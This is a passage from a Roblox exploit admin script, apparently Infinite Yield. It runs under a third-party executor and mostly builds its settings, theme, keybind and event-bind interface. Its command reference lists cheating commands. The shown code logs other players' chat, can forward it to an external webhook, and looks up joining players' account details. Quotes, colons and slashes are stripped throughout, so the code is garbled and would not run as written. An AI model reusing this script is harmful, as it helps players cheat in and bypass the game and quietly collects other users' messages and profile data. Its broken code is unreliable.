...
COREGUI = cloneref(gameGetService(CoreGui))
Players = cloneref(gameGetService(Players))
...
elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
    ...
    Main.Parent = COREGUI
    PARENT = Main
elseif COREGUIFindFirstChild(RobloxGui) then
...
do
	local emoji = ({
		[01 01] = 🎆,
		[(function(Year)
			local A = math.floor(Year100)
			local B = math.floor((13+8A)25)
			local C = (15-B+A-math.floor(A4))%30
			local D = (4+A-math.floor(A4))%7
			local E = (19(Year%19)+C)%30
			local F = (2(Year%4)+4(Year%7)+6E+D)%7
			local G = (22+E+F)
...
CMDsF.BottomImage = rbxassettexturesuiScrollscroll-middle.png
CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
CMDsF.MidImage = rbxassettexturesuiScrollscroll-middle.png
CMDsF.ScrollBarThickness = 8
CMDsF.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
SettingsButton.Image = rbxassetid1204397029
...
ReferenceButton.Image = rbxassetid3523243755
...
SettingsHolder.BottomImage = rbxassettexturesuiScrollscroll-middle.png
SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
SettingsHolder.MidImage = rbxassettexturesuiScrollscroll-middle.png
SettingsHolder.ScrollBarThickness = 8
SettingsHolder.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
ColorsButton = makeSettingsButton(Edit Theme,rbxassetid4911962991)
ColorsButton.Position = UDim2.new(0, 5, 0, 55)
ColorsButton.Size = UDim2.new(1, -10, 0, 25)
ColorsButton.Name = Colors
ColorsButton.Parent = SettingsHolder

Keybinds = makeSettingsButton(Edit Keybinds,rbxassetid129697930)
Keybinds.Position = UDim2.new(0, 5, 0, 85)
Keybinds.Size = UDim2.new(1, -10, 0, 25)
Keybinds.Name = Keybinds
Keybinds.Parent = SettingsHolder

Aliases = makeSettingsButton(Edit Aliases,rbxassetid5147488658)
...
Positions = makeSettingsButton(EditGoto Waypoints,rbxassetid5147488592)
Positions.Position = UDim2.new(0, 5, 0, 145)
Positions.Size = UDim2.new(1, -10, 0, 25)
Positions.Name = Waypoints
Positions.Parent = SettingsHolder

EventBind = makeSettingsButton(Edit Event Binds,rbxassetid5147695474,759)
EventBind.Position = UDim2.new(0, 5, 0, 205)
EventBind.Size = UDim2.new(1, -10, 0, 25)
EventBind.Name = EventBinds
EventBind.Parent = SettingsHolder

Plugins = makeSettingsButton(Manage Plugins,rbxassetid5147695474,743)
...
CloseImage.Image = rbxassetid5054663650
...
PinImage.ZIndex = 10
PinImage.Image = rbxassetid6234691350
...
Logo.Image = rbxassetid1352543873
...
Holder_2.BottomImage = rbxassettexturesuiScrollscroll-middle.png
Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_2.MidImage = rbxassettexturesuiScrollscroll-middle.png
Holder_2.ScrollBarThickness = 0
Holder_2.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
Directions.Text = Click the button below and press a keymouse button. Then select what you want to bind it to.
...
Toggles.ZIndex = 10
Toggles.BottomImage = rbxassettexturesuiScrollscroll-middle.png
Toggles.CanvasSize = UDim2.new(0, 0, 0, 50)
Toggles.ScrollBarThickness = 8
Toggles.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
ExitImage_2.Image = rbxassetid5054663650
...
Holder_4.BottomImage = rbxassettexturesuiScrollscroll-middle.png
Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_4.MidImage = rbxassettexturesuiScrollscroll-middle.png
Holder_4.ScrollBarThickness = 0
Holder_4.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
Holder_3.BottomImage = rbxassettexturesuiScrollscroll-middle.png
Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_3.MidImage = rbxassettexturesuiScrollscroll-middle.png
Holder_3.ScrollBarThickness = 0
Holder_3.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
Holder_5.BottomImage = rbxassettexturesuiScrollscroll-middle.png
Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_5.MidImage = rbxassettexturesuiScrollscroll-middle.png
Holder_5.ScrollBarThickness = 0
Holder_5.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
Img.Image = rbxassetid4113050383
Img.ZIndex = 10
...
ExitImage_3.Image = rbxassetid5054663650
...
PluginsHint.Text = Download plugins from the IY Discord (discord.gg78ZuWSq)
...
ExitImage_5.Image = rbxassetid5054663650
...
ImageLabel.Image = rbxassetid2406617031
...
ImageLabel_2.Image = rbxassetid5054663650
...
scroll_2.ZIndex = 10
scroll_2.BottomImage = rbxassettexturesuiScrollscroll-middle.png
scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_2.ScrollBarThickness = 8
scroll_2.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
scroll_3.ZIndex = 10
scroll_3.BottomImage = rbxassettexturesuiScrollscroll-middle.png
scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_3.ScrollBarThickness = 8
scroll_3.TopImage = rbxassettexturesuiScrollscroll-middle.png
...
TextService = cloneref(gameGetService(TextService))
ViewportTextBox = (function()
	...
	funcs.Update = function(self)
		...
		local cursorText = textsub(1,cursorPos-1)
		local pos = nil
		local leftEnd = -self.TextBox.Position.X.Offset
		local rightEnd = leftEnd + self.View.AbsoluteSize.X

		local totalTextSize = TextServiceGetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
		local cursorTextSize = TextServiceGetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
	...
	local function convert(textbox)
		...
		textbox.ChangedConnect(function(prop)
...
IYMouse = Players.LocalPlayerGetMouse()
PlayerGui = Players.LocalPlayerFindFirstChildWhichIsA(PlayerGui)
UserInputService = cloneref(gameGetService(UserInputService))
TweenService = cloneref(gameGetService(TweenService))
HttpService = cloneref(gameGetService(HttpService))
MarketplaceService = cloneref(gameGetService(MarketplaceService))
RunService = cloneref(gameGetService(RunService))
TeleportService = cloneref(gameGetService(TeleportService))
StarterGui = cloneref(gameGetService(StarterGui))
GuiService = cloneref(gameGetService(GuiService))
Lighting = cloneref(gameGetService(Lighting))
ContextActionService = cloneref(gameGetService(ContextActionService))
ReplicatedStorage = cloneref(gameGetService(ReplicatedStorage))
GroupService = cloneref(gameGetService(GroupService))
PathService = cloneref(gameGetService(PathfindingService))
SoundService = cloneref(gameGetService(SoundService))
Teams = cloneref(gameGetService(Teams))
StarterPlayer = cloneref(gameGetService(StarterPlayer))
InsertService = cloneref(gameGetService(InsertService))
ChatService = cloneref(gameGetService(Chat))
ProximityPromptService = cloneref(gameGetService(ProximityPromptService))
StatsService = cloneref(gameGetService(Stats))
MaterialService = cloneref(gameGetService(MaterialService))
AvatarEditorService = cloneref(gameGetService(AvatarEditorService))
TextChatService = cloneref(gameGetService(TextChatService))
CaptureService = cloneref(gameGetService(CaptureService))
VoiceChatService = cloneref(gameGetService(VoiceChatService))
...
local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserInputServiceGetPlatform())
...
function getRoot(char)
	local rootPart = charFindFirstChild('HumanoidRootPart') or charFindFirstChild('Torso') or charFindFirstChild('UpperTorso')
	return rootPart
end

function tools(plr)
	if plrFindFirstChildOfClass(Backpack)FindFirstChildOfClass('Tool') or plr.CharacterFindFirstChildOfClass('Tool') then
		return true
	end
end

function r15(plr)
	if plr.CharacterFindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
		return true
	end
end
...
function chatMessage(str)
    ...
    if not isLegacyChat then
        TextChatService.TextChannels.RBXGeneralSendAsync(str)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequestFireServer(str, All)
    end
end
...
function getHierarchy(obj)
	...
	if period then
		return 'gameGetService('..service..').'..fullname
	else
		return 'gameGetService('..service..')'..fullname
	end
end
...
function dragGUI(gui)
	task.spawn(function()
		...
		local function update(input)
			...
			TweenServiceCreate(gui, TweenInfo.new(.20), {Position = Position})Play()
		end
		gui.InputBeganConnect(function(input)
		...
		gui.InputChangedConnect(function(input)
...
eventEditor = (function()
			...
			for i,cmd in pairs(event.commands) do
				...
				for idx,set in pairs(event.sets) do
					...
					elseif condType == String then
						if cmdSet ~= 0 then
							metCondition = metCondition and string.find(argVallower(),cmdSetlower())
						end
	...
	local main = create({
		...
		{5,ImageLabel,{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image=rbxassetid5054663650,Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
		...
		{7,ScrollingFrame,{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage=rbxassettexturesuiScrollscroll-middle.png,CanvasSize=UDim2.new(0,0,0,100),Name=List,Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage=rbxassettexturesuiScrollscroll-middle.png,ZIndex=10,}},
		...
		{13,ScrollingFrame,{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage=rbxassettexturesuiScrollscroll-middle.png,CanvasSize=UDim2.new(0,0,0,100),Name=List,Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage=rbxassettexturesuiScrollscroll-middle.png,ZIndex=10,}},
		...
		{50,TextBox,{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text=abcd,TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
		...
		{53,ImageLabel,{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image=rbxassetid1204397029,Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
	})
	main.Name = randomString()
	local mainFrame = mainWaitForChild(Content)
	local eventList = mainFrameWaitForChild(List)
	local eventListHolder = eventListWaitForChild(Holder)
	local cmdTemplate = mainFrameWaitForChild(CmdTemplate)
	local eventTemplate = mainFrameWaitForChild(EventTemplate)
	local settingsFrame = mainFrameWaitForChild(Settings)WaitForChild(Slider)
	local settingsTemplates = mainFrame.SettingsWaitForChild(Templates)
	local settingsList = settingsFrameWaitForChild(List)WaitForChild(Holder)
	...
	settingsFrameWaitForChild(Close).MouseButton1ClickConnect(function()
		settingsFrameTweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
	end)

	local function resizeList()
		local size = 0

		for i,v in pairs(eventListHolderGetChildren()) do
			if v.Name == EventTemplate then
				size = size + 20
				if v.Expand.Rotation == 90 then
					size = size + 20(1+(#events[v.EventNameGetAttribute(RawName)].commands or 0))
				end
			end
		end

		TweenServiceCreate(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)})Play()
	...
	local function resizeSettingsList()
		...
		for i,v in pairs(settingsListGetChildren()) do
			if vIsA(Frame) then
	...
	local function setupCheckbox(button,callback)
		...
		button.On.MouseButton1ClickConnect(function()
			enabled = not enabled
			update()
	...
	local function openSettingsEditor(event,cmd)
		...
		for i,v in pairs(settingsListGetChildren()) do if vIsA(Frame) then vDestroy() end end

		local delayEditor = settingsTemplates.DelayEditorClone()
		delayEditor.Secs.FocusLostConnect(function()
		...
		for i,v in pairs(event.sets) do
			if v.Type == Player then
				local template = settingsTemplates.PlayersClone()
				...
				customTextBox.FocusLostConnect(function()
					if customIsEnabled() then
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end
				end)
			...
			elseif v.Type == String then
				local template = settingsTemplates.StringsClone()
			...
			elseif v.Type == Number then
				local template = settingsTemplates.NumbersClone()
		...
		resizeSettingsList()
		settingsFrameTweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
	end
	...
	local function refreshList()
		for i,v in pairs(eventListHolderGetChildren()) do if vIsA(Frame) then vDestroy() end end

		for name,event in pairs(events) do
			local eventF = eventTemplateClone()
			eventF.EventName.Text = name
			eventF.Visible = true
			eventF.EventNameSetAttribute(RawName, name)
			table.insert(shade2,eventF)
			table.insert(text1,eventF.EventName)
			table.insert(shade1,eventF.Cmds.Add)

			local expanded = false
			eventF.Expand.MouseButton1DownConnect(function()
				expanded = not expanded
				eventFTweenSize(UDim2.new(1,0,0,20 + (expanded and 20#eventF.Cmds.HolderGetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
				eventF.Expand.Rotation = expanded and 90 or 0
				resizeList()
			end)

			local function refreshCommands()
				for i,v in pairs(eventF.Cmds.HolderGetChildren()) do
				...
				for i,cmd in pairs(event.commands) do
					...
					cmdTextBox.FocusLostConnect(function()
						event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
						if onEdited then onEdited() end
					end)

					cmdF.Settings.MouseButton1ClickConnect(function()
						openSettingsEditor(event,cmd)
					end)

					cmdF.Delete.MouseButton1ClickConnect(function()
			...
			newBox.FocusLostConnect(function(enter)
				if enter then
			...
			--eventFGetPropertyChangedSignal(AbsoluteSize)Connect(resizeList)
	...
	local function saveData()
		...
		return HttpServiceJSONEncode(result)
	end

	local function loadData(str)
		local data = HttpServiceJSONDecode(str)
	...
	main.TopBar.Close.MouseButton1ClickConnect(function()
		mainTweenPosition(UDim2.new(0.5,-175,0,-500), InOut, Quart, 0.5, true, nil)
	end)
	dragGUI(main)
...
reference = (function()
	local main = create({
		...
		{7,ScrollingFrame,{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage=rbxassettexturesuiScrollscroll-middle.png,CanvasSize=UDim2.new(0,0,0,1313),Name=List,Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage=rbxassettexturesuiScrollscroll-middle.png,VerticalScrollBarInset=2,ZIndex=10,}},
		...
		{90,TextLabel,{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name=Text,Parent={84},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=;5^btools - gives you 5 sets of btoolsn;10^3^drophats - drops your hats every 3 seconds 10 timesn;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100,TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
		...
		{96,TextLabel,{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name=Text,Parent={91},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=;drophatsrespawn - drops your hats and respawns youn;enable inventoryenable playerlistrefresh - enables those coregui items and refreshes you,TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
	...
	main.Name = randomString()
	main.TopBar.Close.MouseButton1ClickConnect(function()
		mainTweenPosition(UDim2.new(0.5,-250,0,-500), InOut, Quart, 0.5, true, nil)
	end)
	local inviteButton = mainFindFirstChild(InviteButton,true)
	local lastPress = nil
	inviteButton.MouseButton1ClickConnect(function()
		if everyClipboard then
			toClipboard(httpsdiscord.gg78ZuWSq)
		...
		inviteButton.Text = Copy Discord Invite Link (httpsdiscord.gg78ZuWSq)
	end)
	dragGUI(main)
	main.Parent = ScaledHolder

	ReferenceButton.MouseButton1ClickConnect(function()
		mainTweenPosition(UDim2.new(0.5,-250,0.5,-150), InOut, Quart, 0.5, true, nil)
	end)
end)()
...
defaults = HttpServiceJSONEncode(defaultsettings)
nosaves = false
...
createPopup = function(text)
    ...
    ExitImage.Image = rbxassetid5054663650
    ExitImage.ZIndex = 10

    Exit.MouseButton1ClickConnect(function()
        FileErrorDestroy()
    end)
end
...
function saves()
    if writefileExploit() and readfileExploit() and jsonAttempts  10 then
        ...
        if readSuccess then
            if out ~= nil and tostring(out)gsub(%s, ) ~=  then
                local success, response = pcall(function()
                    local json = HttpServiceJSONDecode(out)
                ...
                if dReadSuccess and dOut ~= nil and tostring(dOut)gsub(%s, ) ~=  then
                    ...
                    nosaves = true
                    useFactorySettings()
                    createPopup(There was a problem writing a save file to your PC.nnPlease contact the developersupport team for your exploit and tell them writefilereadfile is not working.nnYour settings, keybinds, waypoints, and aliases will not save if you continue.nnThings to tryn Make sure a 'workspace' folder is located in the same folder as your exploitn If your exploit is inside of a ziprar file, extract it.n Rejoin the game and try again or restart your PC and try again.)
                end
            end
        else
            writefile(IY_FE.iy, defaults, true)
        ...
        if jsonAttempts = 10 then
            nosaves = true
            useFactorySettings()
            createPopup(Sorry, we have attempted to parse your save file, but it is unreadable!nnInfinite Yield is now using factory settings until your exploit's file system works.nnYour save file has not been deleted.)
        else
            nosaves = true
            useFactorySettings()
        end
...
function updatesaves()
	if nosaves == false and writefileExploit() then
		...
		writefileCooldown(IY_FE.iy, HttpServiceJSONEncode(update))
	end
end
...
function maximizeHolder()
	if StayOpen == false then
		HolderTweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), InOut, Quart, 0.2, true, nil)
	end
end
...
function minimizeHolder()
	if StayOpen == false then
		HolderTweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), InOut, Quart, 0.5, true, nil)
	end
end

function cmdbarHolder()
	if StayOpen == false then
		HolderTweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), InOut, Quart, 0.5, true, nil)
	end
end
...
function notify(text,text2,length)
	task.spawn(function()
		...
		if pinNotification then pinNotificationDisconnect() end
		pinNotification = PinButton.MouseButton1ClickConnect(function()
			task.spawn(function()
				pinNotificationDisconnect()
		...
		NotificationTweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), InOut, Quart, 0.5, true, nil)
		wait(0.6)
		...
		NotificationTweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), InOut, Quart, 0.5, true, nil)
		CloseButton.MouseButton1ClickConnect(function()
			NotificationTweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), InOut, Quart, 0.5, true, nil)
			closepressed = true
			pinNotificationDisconnect()
		end)
...
function CreateLabel(Name, Text)
	if lastMessage == Name..Text then
		...
		if #scroll_2GetChildren() = 2546 then
			scroll_2ClearAllChildren()
		end
		local alls = 0
		for i,v in pairs(scroll_2GetChildren()) do
			if v then
		...
		tlTweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
		TweenServiceCreate(tl, TweenInfo.new(1.25, Enum.EasingStyle.Linear), { TextTransparency = 0 })Play()
	end
end

function CreateJoinLabel(plr,ID)
	if #scroll_3GetChildren() = 2546 then
		scroll_3ClearAllChildren()
	end
	...
	info1.Text = Username ..plr.Name..nJoined Server ..Time()
	...
	info2.Text = User ID ..ID..nAccount Age ..plr.AccountAge..nJoined Roblox Loading...
	...
	ImageLabel_3.Image = PlayersGetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
	...
	wait()
	local user = gameHttpGet(httpsusers.roblox.comv1users..ID)
	local json = HttpServiceJSONDecode(user)
	local date = json[created]sub(1,10)
	local splitDates = string.split(date,-)
	info2.Text = string.gsub(info2.Text, Loading...,splitDates[2]....splitDates[3]....splitDates[1])
end

IYMouse.KeyDownConnect(function(Key)
	if (Key==prefix) then
...
Holder.MouseEnterConnect(function()
	lastMinimizeReq = 0
	maximizeHolder()
end)

Holder.MouseLeaveConnect(function()
	if not CmdbarIsFocused() then
		local reqTime = tick()
...
ColorsButton.MouseButton1ClickConnect(function()
	...
	if not colorpickerOpen then
		...
		picker = gameGetObjects(rbxassetid4908465318)[1]
		...
		local ColorPicker do
			...
			ColorPicker.new = function()
				...
				local function updateColor(noupdate)
					local relativeX,relativeY,relativeStripY = 219 - hue219, 199 - sat199, 199 - val199
					local hsvColor = Color3.fromHSV(hue,sat,val)

					if noupdate == 2 or not noupdate then
						hueInput.Text = tostring(math.ceil(359hue))
						satInput.Text = tostring(math.ceil(255sat))
						valInput.Text = tostring(math.floor(255val))
					end
					if noupdate == 1 or not noupdate then
						redInput.Text = tostring(math.floor(255red))
						greenInput.Text = tostring(math.floor(255green))
						blueInput.Text = tostring(math.floor(255blue))
					end
					...
					if newMt.Changed then newMtChanged(chosenColor) end
				end
				...
				local function hookButtons(frame,func)
					frame.ArrowFrame.Up.InputBeganConnect(function(input)
						...
						elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
							...
							releaseEvent = UserInputService.InputEndedConnect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEventDisconnect()
								pressing = false
							end)
					...
					frame.ArrowFrame.Up.InputEndedConnect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							frame.ArrowFrame.Up.BackgroundTransparency = 1
						end
					end)

					frame.ArrowFrame.Down.InputBeganConnect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
					...
					frame.ArrowFrame.Down.InputEndedConnect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
				...
				colorSpace.InputBeganConnect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						...
						releaseEvent = UserInputService.InputEndedConnect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEventDisconnect()
							mouseEventDisconnect()
						end)

						mouseEvent = UserInputService.InputChangedConnect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								colorSpaceInput()
							end
						end)
				...
				colorStrip.InputBeganConnect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,mouseEvent
				...
				local function updateHue(str)
					...
					if num then
						...
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						hueInput.Text = tostring(hue359)
						updateColor(1)
					end
				end
				hueInput.FocusLostConnect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
				...
				local function updateSat(str)
					...
					if num then
						...
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						satInput.Text = tostring(sat255)
						updateColor(1)
					end
				end
				satInput.FocusLostConnect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
				...
				local function updateVal(str)
					...
					if num then
						...
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						valInput.Text = tostring(val255)
						updateColor(1)
					end
				end
				valInput.FocusLostConnect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
				...
				local function updateRed(str)
					...
					if num then
						...
						redInput.Text = tostring(red255)
						updateColor(2)
					end
				end
				redInput.FocusLostConnect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
				...
				local function updateGreen(str)
					...
					if num then
						...
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						greenInput.Text = tostring(green255)
						updateColor(2)
					end
				end
				greenInput.FocusLostConnect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
				...
				local function updateBlue(str)
					...
					if num then
						...
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						blueInput.Text = tostring(blue255)
						updateColor(2)
					end
				end
				blueInput.FocusLostConnect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)

				local colorChoice = Instance.new(TextButton)
				colorChoice.Name = Choice
				colorChoice.Size = UDim2.new(0,25,0,18)
				colorChoice.BorderColor3 = Color3.new(96255,96255,96255)
				colorChoice.Text = 
				...
				for i,v in pairs(basicColors) do
					local newColor = colorChoiceClone()
					newColor.BackgroundColor3 = v
					newColor.Position = UDim2.new(0,1 + 30column,0,21 + 23row)

					newColor.MouseButton1ClickConnect(function()
				...
				for i = 1,12 do
					...
					newColor.Position = UDim2.new(0,1 + 30column,0,20 + 23row)
					...
					newColor.MouseButton2ClickConnect(function()
				...
				shade1Button.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,shade1) end end)
				shade1Button.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
				shade1Button.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)

				shade2Button.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,shade2) end end)
				shade2Button.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
				shade2Button.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)

				shade3Button.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,shade3) end end)
				shade3Button.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
				shade3Button.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)

				text1Button.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,text1) end end)
				text1Button.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
				text1Button.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)

				text2Button.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,text2) end end)
				text2Button.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
				text2Button.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)

				scrollButton.MouseButton1ClickConnect(function() if newMt.Confirm then newMtConfirm(chosenColor,scroll) end end)
				scrollButton.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
				scrollButton.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)

				cancelButton.MouseButton1ClickConnect(function() if newMt.Cancel then newMtCancel() end end)
				cancelButton.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
				cancelButton.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)

				defaultButton.MouseButton1ClickConnect(function() if newMt.Default then newMtDefault() end end)
				defaultButton.InputBeganConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
				defaultButton.InputEndedConnect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)

				pickerExit.MouseButton1ClickConnect(function()
					pickerTweenPosition(UDim2.new(0.5, -219, 0, -500), InOut, Quart, 0.5, true, nil)
				end)
		...
		pickerTweenPosition(UDim2.new(0.5, -219, 0, 100), InOut, Quart, 0.5, true, nil)
...
SettingsButton.MouseButton1ClickConnect(function()
	if SettingsOpen == false then SettingsOpen = true
		SettingsTweenPosition(UDim2.new(0, 0, 0, 45), InOut, Quart, 0.5, true, nil)
		CMDsF.Visible = false
	else SettingsOpen = false
		CMDsF.Visible = true
		SettingsTweenPosition(UDim2.new(0, 0, 0, 220), InOut, Quart, 0.5, true, nil)
	end
end)

On.MouseButton1ClickConnect(function()
...
Clear.MouseButton1DownConnect(function()
	for _, child in pairs(scroll_2GetChildren()) do
		childDestroy()
	end
	scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
end)

Clear_2.MouseButton1DownConnect(function()
	for _, child in pairs(scroll_3GetChildren()) do
		childDestroy()
	end
	scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
end)

Toggle.MouseButton1DownConnect(function()
	if logsEnabled then
		logsEnabled = false
		Toggle.Text = 'Disabled'
		updatesaves()
...
Toggle_2.MouseButton1DownConnect(function()
	if jLogsEnabled then
		jLogsEnabled = false
		Toggle_2.Text = 'Disabled'
		updatesaves()
...
selectChat.MouseButton1DownConnect(function()
	join.Visible = false
	chat.Visible = true
...
selectJoin.MouseButton1DownConnect(function()
	chat.Visible = false
	join.Visible = true	
...
if not writefileExploit() then
    notify(Saves, Your exploit does not support readwrite file. Your settings will not save.)
end

function sendChatWebhook(player, message)
    if httprequest and vtype(logsWebhook, string) then
        local log = HttpServiceJSONEncode({
            content = message,
            avatar_url = httpsfiles.catbox.moei968v2.jpg,
...
ChatLog = function(player)
    player.ChattedConnect(function(message)
...
SaveChatlogs.MouseButton1DownConnect(function()
	if writefileExploit() then
		if #scroll_2GetChildren()  0 then
			notify(Loading,'Hold on a sec')
			local placeName = CleanFileName(MarketplaceServiceGetProductInfo(PlaceId).Name)
